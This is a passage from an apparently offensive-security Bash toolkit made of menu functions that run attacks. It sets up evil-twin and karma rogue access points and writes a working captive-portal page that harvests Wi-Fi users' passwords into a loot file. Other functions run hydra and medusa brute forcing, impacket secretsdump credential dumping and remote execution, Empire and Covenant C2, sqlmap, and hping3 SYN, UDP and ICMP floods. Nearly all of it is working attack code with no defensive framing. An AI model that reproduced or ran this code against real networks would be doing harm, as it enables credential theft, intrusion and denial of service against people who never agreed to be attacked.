    if [[ -n "$UPLINK" ]]; then
        echo "$UPLINK" > "${TMP_DIR}/evil_uplink.txt"
        iptables -t nat -A POSTROUTING -o "$UPLINK" -j MASQUERADE
        iptables -A FORWARD -i "$UPLINK" -o "$IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
        iptables -A FORWARD -i "$IFACE" -o "$UPLINK" -j ACCEPT
    fi

    log_loot "Evil twin running on $IFACE (log: $ap_log)"
    [[ -n "$TARGET_BSSID" ]] && log_info "Cloning BSSID: $TARGET_BSSID"
    operation_summary "Evil twin" "$start_ms" "$ap_log"
}

cmd_captive_portal() {
    require_root || return 1
    mkdir -p "$TMP_DIR" "$LOOT_DIR"
    echo -ne "    ${C_GHOST}Interface to listen on [${IFACE:-wlan0}]: ${C_RESET}"
    read -r portal_iface
    portal_iface="${portal_iface:-${IFACE:-wlan0}}"
    operation_header "Captive portal" "$portal_iface"
    local start_ms
    start_ms=$(start_timer_ms)
    echo "$portal_iface" > "${TMP_DIR}/portal_iface.txt"
    local creds_file
    creds_file="${LOOT_DIR}/creds_$(date +%Y%m%d_%H%M%S).txt"
    local portal_dir="${TMP_DIR}/portal"
    mkdir -p "$portal_dir"
    cat > "${portal_dir}/portal.py" <<PY
import http.server
import urllib.parse
from datetime import datetime

CREDS_FILE = "${creds_file}"

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length).decode()
        data = urllib.parse.parse_qs(body)
        with open(CREDS_FILE, 'a', encoding='utf-8') as fh:
            fh.write(f"[{datetime.utcnow().isoformat()}] {data}\n")
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

if __name__ == '__main__':
    http.server.test(HandlerClass=Handler, port=8080, bind='0.0.0.0')
PY

    cat > "${portal_dir}/index.html" <<'HTML'
<html><head><title>Login</title></head><body><h3>Network Login</h3><form method="POST"><input name="user" placeholder="Username"/><br/><input name="pass" placeholder="Password" type="password"/><br/><button type="submit">Login</button></form></body></html>
HTML

    local portal_pid_file="${TMP_DIR}/portal.pid"
    (cd "$portal_dir" && python3 portal.py >/dev/null 2>&1 & echo $! > "$portal_pid_file")
    iptables -t nat -A PREROUTING -i "$portal_iface" -p tcp --dport 80 -j REDIRECT --to-port 8080
    log_loot "Captive portal running on $portal_iface (creds -> $creds_file)"
    operation_summary "Captive portal" "$start_ms" "$creds_file"
}

cmd_karma_attack() {
    require_root || return 1
    get_interface || return 1
    mkdir -p "$TMP_DIR"
    local karma_pid_file="${TMP_DIR}/karma_${IFACE}.pid"
    if check_tool "hostapd-mana" 2>/dev/null; then
        operation_header "hostapd-mana" "$IFACE"
        local start_ms
        start_ms=$(start_timer_ms)
        log_attack "Starting hostapd-mana karma on $IFACE"
        log_command_preview "hostapd-mana -i \"${IFACE}\" -m"
        hostapd-mana -i "$IFACE" -m >> "${LOG_DIR}/karma.log" 2>&1 & echo $! > "$karma_pid_file"
        operation_summary "hostapd-mana" "$start_ms" "${LOG_DIR}/karma.log"
    elif check_tool "airbase-ng" 2>/dev/null; then
        operation_header "airbase-ng" "$IFACE"
        local start_ms
        start_ms=$(start_timer_ms)
        log_attack "Starting airbase-ng karma on $IFACE"
        log_command_preview "airbase-ng -P -C 30 -v \"${IFACE}\""
        airbase-ng -P -C 30 -v "$IFACE" >> "${LOG_DIR}/karma.log" 2>&1 & echo $! > "$karma_pid_file"
        operation_summary "airbase-ng" "$start_ms" "${LOG_DIR}/karma.log"
    else
        log_error "hostapd-mana or airbase-ng required"
        return 1
    fi
}

cmd_evil_twin_stop() {
    require_root || return 1
    operation_header "Rogue AP stop" "active APs"
    local start_ms
    start_ms=$(start_timer_ms)
    local ap_iface=""
    local portal_iface=""
    [[ -f "${TMP_DIR}/evil_iface.txt" ]] && ap_iface="$(cat "${TMP_DIR}/evil_iface.txt")"
    [[ -f "${TMP_DIR}/portal_iface.txt" ]] && portal_iface="$(cat "${TMP_DIR}/portal_iface.txt")"
    for pid_file in "$TMP_DIR"/hostapd_*.pid "$TMP_DIR"/dnsmasq_*.pid "$TMP_DIR"/portal.pid "$TMP_DIR"/karma_*.pid; do
        [[ -f "$pid_file" ]] || continue
        local pid
        pid=$(cat "$pid_file")
        kill "$pid" 2>/dev/null || true
        rm -f "$pid_file"
    done
    if [[ -f "$TMP_DIR/evil_uplink.txt" ]]; then
        local uplink
        uplink=$(cat "$TMP_DIR/evil_uplink.txt")
        iptables -t nat -D POSTROUTING -o "$uplink" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -i "$uplink" -o "${ap_iface:-$IFACE}" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
        iptables -D FORWARD -i "${ap_iface:-$IFACE}" -o "$uplink" -j ACCEPT 2>/dev/null || true
        rm -f "$TMP_DIR/evil_uplink.txt"
    fi
    if [[ -n "$portal_iface" ]]; then
        iptables -t nat -D PREROUTING -i "$portal_iface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    else
        iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    fi
    rm -f "${TMP_DIR}/evil_iface.txt" "${TMP_DIR}/portal_iface.txt"
    operation_summary "Rogue AP stop" "$start_ms" "${LOG_DIR}/evil_twin_stop.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - CREDENTIALS & BRUTE FORCE
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_hydra_bruteforce() {
    check_tool "hydra" || return 1
    get_target || return 1
    echo -ne "    ${C_GHOST}Service (ssh/ftp/http-form-post/etc): ${C_RESET}"
    read -r service
    [[ -z "$service" ]] && { log_error "Service required"; return 1; }
    echo -ne "    ${C_GHOST}Username (leave blank to use user list): ${C_RESET}"
    read -r user
    echo -ne "    ${C_GHOST}User list (optional): ${C_RESET}"
    read -r userlist
    echo -ne "    ${C_GHOST}Password list [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r passlist
    passlist="${passlist:-/usr/share/wordlists/rockyou.txt}"
    echo -ne "    ${C_GHOST}Port (optional): ${C_RESET}"
    read -r port

    [[ -z "$user" && -z "$userlist" ]] && { log_error "Provide a username or user list"; return 1; }

    local args=()
    if [[ -n "$userlist" ]]; then
        args+=("-L" "$userlist")
    else
        args+=("-l" "$user")
    fi
    args+=("-P" "$passlist")
    [[ -n "$port" ]] && args+=("-s" "$port")
    args+=("$TARGET" "$service")
    operation_header "Hydra" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Hydra attack on $TARGET ($service)"
    log_command_preview "hydra ${args[*]} -o ${OUTPUT_FILE}_hydra.txt"
    hydra "${args[@]}" -o "${OUTPUT_FILE}_hydra.txt" | tee -a "${LOG_DIR}/hydra.log"
    log_loot "Results saved: ${OUTPUT_FILE}_hydra.txt"
    operation_summary "Hydra" "$start_ms" "${OUTPUT_FILE}_hydra.txt"
}

cmd_medusa_bruteforce() {
    check_tool "medusa" || return 1
    get_target || return 1
    echo -ne "    ${C_GHOST}Service (ssh/ftp/smb): ${C_RESET}"
    read -r service
    [[ -z "$service" ]] && { log_error "Service required"; return 1; }
    echo -ne "    ${C_GHOST}User list: ${C_RESET}"
    read -r userlist
    [[ -z "$userlist" ]] && { log_error "User list required"; return 1; }
    echo -ne "    ${C_GHOST}Password list [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r passlist
    passlist="${passlist:-/usr/share/wordlists/rockyou.txt}"
    echo -ne "    ${C_GHOST}Port (optional): ${C_RESET}"
    read -r port

    local args=("-h" "$TARGET" "-U" "$userlist" "-P" "$passlist" "-M" "$service")
    [[ -n "$port" ]] && args+=("-n" "$port")
    operation_header "Medusa" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Medusa attack on $TARGET ($service)"
    log_command_preview "medusa ${args[*]}"
    medusa "${args[@]}" | tee -a "${LOG_DIR}/medusa.log"
    operation_summary "Medusa" "$start_ms" "${LOG_DIR}/medusa.log"
}

cmd_crackmapexec() {
    check_tool "crackmapexec" || return 1
    get_target || return 1
    echo -ne "    ${C_GHOST}Protocol [smb/ssh/winrm]: ${C_RESET}"
    read -r protocol
    protocol="${protocol:-smb}"
    echo -ne "    ${C_GHOST}Username: ${C_RESET}"
    read -r user
    echo -ne "    ${C_GHOST}Password (or hash): ${C_RESET}"
    read -r pass

    local args=("$protocol" "$TARGET")
    [[ -n "$user" ]] && args+=("-u" "$user")
    [[ -n "$pass" ]] && args+=("-p" "$pass")
    args+=("--shares")
    operation_header "CrackMapExec" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "CrackMapExec on $TARGET ($protocol)"
    log_command_preview "crackmapexec ${args[*]}"
    crackmapexec "${args[@]}" | tee -a "${LOG_DIR}/cme.log"
    operation_summary "CrackMapExec" "$start_ms" "${LOG_DIR}/cme.log"
}

cmd_empire() {
    check_tool "empire" || return 1
    operation_header "Empire" "C2"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Launching Empire C2"
    log_command_preview "empire"
    empire
    operation_summary "Empire" "$start_ms" "${LOG_DIR}/empire.log"
}

cmd_covenant() {
    if command -v covenant &>/dev/null; then
        operation_header "Covenant" "C2"
        local start_ms
        start_ms=$(start_timer_ms)
        log_attack "Launching Covenant"
        log_command_preview "covenant"
        covenant
        operation_summary "Covenant" "$start_ms" "${LOG_DIR}/covenant.log"
    else
        log_error "Covenant launcher not found (expected 'covenant')"
        echo -e "    ${C_SHADOW}Start manually from Covenant directory if installed${C_RESET}"
        return 1
    fi
}

cmd_mimikatz() {
    local secrets_cmd="python3 -m impacket.examples.secretsdump"
    if command -v impacket-secretsdump &>/dev/null; then
        secrets_cmd="impacket-secretsdump"
    fi
    get_target || return 1
    echo -ne "    ${C_GHOST}Domain (blank for WORKGROUP): ${C_RESET}"
    read -r domain
    domain="${domain:-WORKGROUP}"
    echo -ne "    ${C_GHOST}Username: ${C_RESET}"
    read -r user
    echo -ne "    ${C_GHOST}Password/NTLM hash: ${C_RESET}"
    read -r secret
    local out_file="${LOOT_DIR}/secrets_${TARGET//[^a-zA-Z0-9._-]/_}.txt"
    operation_header "Secretsdump" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Impacket secretsdump against $TARGET"
    log_command_preview "$secrets_cmd ${domain}/${user}:***@${TARGET} -outputfile ${out_file}"
    $secrets_cmd "${domain}/${user}:${secret}@${TARGET}" -outputfile "$out_file"
    log_loot "Dump saved: $out_file"
    operation_summary "Secretsdump" "$start_ms" "$out_file"
}

cmd_impacket_scripts() {
    echo -ne "    ${C_GHOST}Impacket script (wmiexec.py/psexec.py/etc): ${C_RESET}"
    read -r script
    [[ -z "$script" ]] && { log_error "Script required"; return 1; }
    echo -ne "    ${C_GHOST}Arguments (e.g., DOMAIN/user:pass@target): ${C_RESET}"
    read -r args
    local script_base="${script%.py}"
    IFS=' ' read -r -a arg_array <<< "$args"
    local start_ms
    start_ms=$(start_timer_ms)
    if command -v "$script" &>/dev/null; then
        operation_header "Impacket" "$script"
        log_attack "Running $script $args"
        $script "${arg_array[@]}" | tee -a "${LOG_DIR}/impacket.log"
    else
        operation_header "Impacket" "$script_base"
        log_attack "Running python impacket.examples.${script_base}"
        python3 -m "impacket.examples.${script_base}" "${arg_array[@]}" | tee -a "${LOG_DIR}/impacket.log"
    fi
    operation_summary "Impacket" "$start_ms" "${LOG_DIR}/impacket.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - WEB
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

run_nikto() {
    check_tool "nikto" || return 1
    operation_header "Nikto" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Nikto scan on $TARGET"
    log_command_preview "nikto -h \"${TARGET}\" -o \"${OUTPUT_FILE}_nikto.txt\""
    nikto -h "$TARGET" -o "${OUTPUT_FILE}_nikto.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_nikto.txt"
    operation_summary "Nikto" "$start_ms" "${OUTPUT_FILE}_nikto.txt"
}

run_wpscan() {
    check_tool "wpscan" || return 1
    operation_header "WPScan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "WordPress scan on $TARGET"
    log_command_preview "wpscan --url \"${TARGET}\" --enumerate u,p,t"
    wpscan --url "$TARGET" --enumerate u,p,t | tee -a "${LOG_DIR}/web.log"
    operation_summary "WPScan" "$start_ms" "${LOG_DIR}/web.log"
}

run_gobuster() {
    check_tool "gobuster" || return 1
    
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    [[ ! -f "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"
    
    operation_header "Gobuster" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Directory brute force on $TARGET"
    log_command_preview "gobuster dir -u \"${TARGET}\" -w \"${wordlist}\" -o \"${OUTPUT_FILE}_gobuster.txt\""
    gobuster dir -u "$TARGET" -w "$wordlist" -o "${OUTPUT_FILE}_gobuster.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_gobuster.txt"
    operation_summary "Gobuster" "$start_ms" "${OUTPUT_FILE}_gobuster.txt"
}

run_ffuf() {
    check_tool "ffuf" || return 1
    
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    echo -ne "    ${C_GHOST}Wordlist [$wordlist]: ${C_RESET}"
    read -r custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"
    
    operation_header "FFUF" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "FFUF fuzzing on $TARGET"
    log_command_preview "ffuf -u ${TARGET}/FUZZ -w ${wordlist} -o ${OUTPUT_FILE}_ffuf.json"
    ffuf -u "${TARGET}/FUZZ" -w "$wordlist" -o "${OUTPUT_FILE}_ffuf.json" | tee -a "${LOG_DIR}/web.log"
    operation_summary "FFUF" "$start_ms" "${OUTPUT_FILE}_ffuf.json"
}

run_nuclei() {
    check_tool "nuclei" || return 1
    operation_header "Nuclei" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Nuclei scan on $TARGET"
    log_command_preview "nuclei -u \"${TARGET}\" -o \"${OUTPUT_FILE}_nuclei.txt\""
    nuclei -u "$TARGET" -o "${OUTPUT_FILE}_nuclei.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_nuclei.txt"
    operation_summary "Nuclei" "$start_ms" "${OUTPUT_FILE}_nuclei.txt"
}

run_httpx() {
    check_tool "httpx" || return 1
    operation_header "httpx" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "httpx probing for $TARGET"
    log_command_preview "echo ${TARGET} | httpx -title -status-code -tech-detect -o ${OUTPUT_FILE}_httpx.txt"
    echo "$TARGET" | httpx -title -status-code -tech-detect -o "${OUTPUT_FILE}_httpx.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_httpx.txt"
    operation_summary "httpx" "$start_ms" "${OUTPUT_FILE}_httpx.txt"
}

run_subfinder() {
    check_tool "subfinder" || return 1
    operation_header "Subfinder" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Subfinder enumeration for $TARGET"
    log_command_preview "subfinder -d \"${TARGET}\" -o \"${OUTPUT_FILE}_subfinder.txt\""
    subfinder -d "$TARGET" -o "${OUTPUT_FILE}_subfinder.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_subfinder.txt"
    operation_summary "Subfinder" "$start_ms" "${OUTPUT_FILE}_subfinder.txt"
}

run_amass() {
    check_tool "amass" || return 1
    operation_header "Amass" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Amass mapping for $TARGET"
    log_command_preview "amass enum -d \"${TARGET}\" -o \"${OUTPUT_FILE}_amass.txt\""
    amass enum -d "$TARGET" -o "${OUTPUT_FILE}_amass.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_amass.txt"
    operation_summary "Amass" "$start_ms" "${OUTPUT_FILE}_amass.txt"
}

run_burpsuite() {
    check_tool "burpsuite" || return 1
    operation_header "Burp Suite" "$TARGET"
    log_info "Launching Burp Suite"
    log_command_preview "burpsuite"
    burpsuite &
}

cmd_sqlmap() {
    check_tool "sqlmap" || return 1
    
    echo -ne "    ${C_GHOST}Target URL with parameter (e.g., http://site.com/page?id=1): ${C_RESET}"
    read -r url
    
    [[ -z "$url" ]] && { log_error "URL required"; return 1; }
    
    operation_header "sqlmap" "$url"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "SQL injection on $url"
    log_command_preview "sqlmap -u \"${url}\" --batch --risk=2 --level=3"
    echo
    sqlmap -u "$url" --batch --risk=2 --level=3 | tee -a "${LOG_DIR}/web.log"
    operation_summary "sqlmap" "$start_ms" "${LOG_DIR}/web.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - EXPLOIT
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_metasploit() {
    check_tool "msfconsole" || return 1
    operation_header "Metasploit" "console"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Launching Metasploit Framework"
    log_command_preview "msfconsole"
    echo
    msfconsole
    operation_summary "Metasploit" "$start_ms" "${LOG_DIR}/metasploit.log"
}

cmd_searchsploit() {
    check_tool "searchsploit" || return 1
    
    echo -ne "    ${C_GHOST}Search term: ${C_RESET}"
    read -r term
    
    [[ -z "$term" ]] && { log_error "Search term required"; return 1; }
    
    operation_header "searchsploit" "$term"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Searching exploits for: $term"
    echo
    log_command_preview "searchsploit ${term}"
    searchsploit "$term"
    operation_summary "searchsploit" "$start_ms" "${LOG_DIR}/searchsploit.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - STRESS
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_iperf3() {
    check_tool "iperf3" || return 1
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} Run as server"
    echo -e "    ${C_GHOST}[2]${C_RESET} Run as client"
    echo
    echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
    read -r choice
    
    case "$choice" in
        1)
            operation_header "iperf3" "server"
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Starting iperf3 server"
            log_command_preview "iperf3 -s"
            iperf3 -s
            operation_summary "iperf3 server" "$start_ms" "${LOG_DIR}/iperf3_server.log"
            ;;
        2)
            echo -ne "    ${C_GHOST}Server IP: ${C_RESET}"
            read -r server
            echo -ne "    ${C_GHOST}Duration (seconds, default 10): ${C_RESET}"
            read -r duration
            duration="${duration:-10}"
            
            operation_header "iperf3" "$server"
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Bandwidth test to $server for ${duration}s"
            log_command_preview "iperf3 -c ${server} -t ${duration}"
            iperf3 -c "$server" -t "$duration"
            operation_summary "iperf3 client" "$start_ms" "${LOG_DIR}/iperf3_client.log"
            ;;
    esac
}

cmd_hping3() {
    check_tool "hping3" || return 1
    require_root || return 1
    get_target || return 1
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} SYN flood"
    echo -e "    ${C_GHOST}[2]${C_RESET} UDP flood"
    echo -e "    ${C_GHOST}[3]${C_RESET} ICMP flood"
    echo -e "    ${C_GHOST}[4]${C_RESET} Custom"
    echo
    echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
    read -r choice
    
    echo -ne "    ${C_GHOST}Port (default 80): ${C_RESET}"
    read -r port
    port="${port:-80}"
    
    echo -ne "    ${C_GHOST}Packet count (default 1000): ${C_RESET}"
    read -r count
    count="${count:-1000}"
    
    log_attack "hping3 attack on $TARGET:$port"
    
    case "$choice" in
        1) operation_header "hping3 SYN" "$TARGET"; log_command_preview "hping3 -S --flood -p ${port} -c ${count} ${TARGET}"; hping3 -S --flood -p "$port" -c "$count" "$TARGET" ;;
        2) operation_header "hping3 UDP" "$TARGET"; log_command_preview "hping3 --udp --flood -p ${port} -c ${count} ${TARGET}"; hping3 --udp --flood -p "$port" -c "$count" "$TARGET" ;;
        3) operation_header "hping3 ICMP" "$TARGET"; log_command_preview "hping3 --icmp --flood -c ${count} ${TARGET}"; hping3 --icmp --flood -c "$count" "$TARGET" ;;
        4)
            echo -ne "    ${C_GHOST}Custom flags: ${C_RESET}"
            read -r flags
            IFS=' ' read -r -a flag_array <<< "$flags"
            operation_header "hping3 custom" "$TARGET"
            log_command_preview "hping3 ${flag_array[*]} ${TARGET}"
            hping3 "${flag_array[@]}" "$TARGET"
            ;;
    esac
}

cmd_http_load() {
    check_tool "ab" || { log_warning "ab not found. Install: sudo apt install apache2-utils"; return 1; }
    get_target || return 1
    
    echo -ne "    ${C_GHOST}Concurrent connections (default 10): ${C_RESET}"
    read -r conns
    conns="${conns:-10}"
    
    echo -ne "    ${C_GHOST}Total requests (default 1000): ${C_RESET}"
    read -r reqs
    reqs="${reqs:-1000}"
    
    operation_header "ab" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "HTTP load test on $TARGET ($reqs requests, $conns concurrent)"
    log_command_preview "ab -n ${reqs} -c ${conns} ${TARGET}/"
    echo
    ab -n "$reqs" -c "$conns" "$TARGET/"
    operation_summary "HTTP load" "$start_ms" "${LOG_DIR}/http_load.log"
}

cmd_netem() {
    require_root || return 1
    get_interface || return 1
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} Add latency"
    echo -e "    ${C_GHOST}[2]${C_RESET} Add packet loss"
    echo -e "    ${C_GHOST}[3]${C_RESET} Add bandwidth limit"
    echo -e "    ${C_GHOST}[4]${C_RESET} Clear all impairments"
    echo -e "    ${C_GHOST}[5]${C_RESET} Show current rules"
    echo
    echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
    read -r choice
    
    case "$choice" in
        1)
            echo -ne "    ${C_GHOST}Latency (ms): ${C_RESET}"
            read -r latency
            local start_ms
            start_ms=$(start_timer_ms)
            tc qdisc add dev "$IFACE" root netem delay "${latency}ms"
            operation_summary "Netem latency" "$start_ms" "$IFACE"
            ;;
        2)
            echo -ne "    ${C_GHOST}Packet loss (%): ${C_RESET}"
            read -r loss
            local start_ms
            start_ms=$(start_timer_ms)
            tc qdisc add dev "$IFACE" root netem loss "${loss}%"
            operation_summary "Netem loss" "$start_ms" "$IFACE"
            ;;
        3)
            echo -ne "    ${C_GHOST}Rate limit (e.g., 1mbit): ${C_RESET}"
            read -r rate
            local start_ms
            start_ms=$(start_timer_ms)
            tc qdisc add dev "$IFACE" root tbf rate "$rate" burst 32kbit latency 400ms
            operation_summary "Netem rate" "$start_ms" "$rate"
            ;;
        4)
            local start_ms
            start_ms=$(start_timer_ms)
            tc qdisc del dev "$IFACE" root 2>/dev/null
            operation_summary "Netem clear" "$start_ms" "$IFACE"
            ;;
        5)
            operation_header "Netem show" "$IFACE"
            tc qdisc show dev "$IFACE"
            ;;
    esac
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - OSINT
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

run_theharvester() {
    check_tool "theHarvester" || check_tool "theharvester" || return 1
    operation_header "theHarvester" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "theHarvester on $TARGET"
    echo
    log_command_preview "theHarvester -d ${TARGET} -b all"
    theHarvester -d "$TARGET" -b all 2>/dev/null || theharvester -d "$TARGET" -b all
    operation_summary "theHarvester" "$start_ms" "${LOG_DIR}/osint.log"
}

run_reconng() {
    check_tool "recon-ng" || return 1
    operation_header "Recon-ng" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Launching Recon-ng"
    log_command_preview "recon-ng"
    recon-ng
    operation_summary "Recon-ng" "$start_ms" "${LOG_DIR}/osint.log"
}

run_shodan() {
    if ! command -v shodan &>/dev/null; then
        log_warning "Shodan CLI not found"
        echo -e "    ${C_SHADOW}Install: pip3 install shodan && shodan init <API_KEY>${C_RESET}"
        return 1
    fi
    operation_header "Shodan" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Shodan search for $TARGET"
    echo
    log_command_preview "shodan host ${TARGET}"
    shodan host "$TARGET"
    operation_summary "Shodan" "$start_ms" "${LOG_DIR}/osint.log"
}

run_whois() {
    check_tool "whois" || return 1
    operation_header "WHOIS" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "WHOIS lookup for $TARGET"
    echo
    log_command_preview "whois ${TARGET}"
    whois "$TARGET"
    operation_summary "WHOIS" "$start_ms" "${LOG_DIR}/osint.log"
}

cmd_google_dork() {
    echo -ne "    ${C_GHOST}Domain: ${C_RESET}"
    read -r domain
    
    echo
    echo -e "    ${C_SKULL}Common Google Dorks for ${C_VENOM}$domain${C_RESET}:"
    echo
    echo -e "    ${C_GHOST}site:$domain filetype:pdf${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain filetype:xls${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain inurl:admin${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain inurl:login${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain intitle:\"index of\"${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain ext:sql | ext:db | ext:log${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain intext:password${C_RESET}"
    echo -e "    ${C_GHOST}\"$domain\" inurl:pastebin${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}Copy and search in your browser${C_RESET}"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - UTILITIES
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_traffic_capture() {
    get_interface || return 1
    operation_header "Traffic capture" "$IFACE"
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} tcpdump (CLI)"
    echo -e "    ${C_GHOST}[2]${C_RESET} Wireshark (GUI)"
    echo -e "    ${C_GHOST}[3]${C_RESET} tshark (CLI + analysis)"
    echo
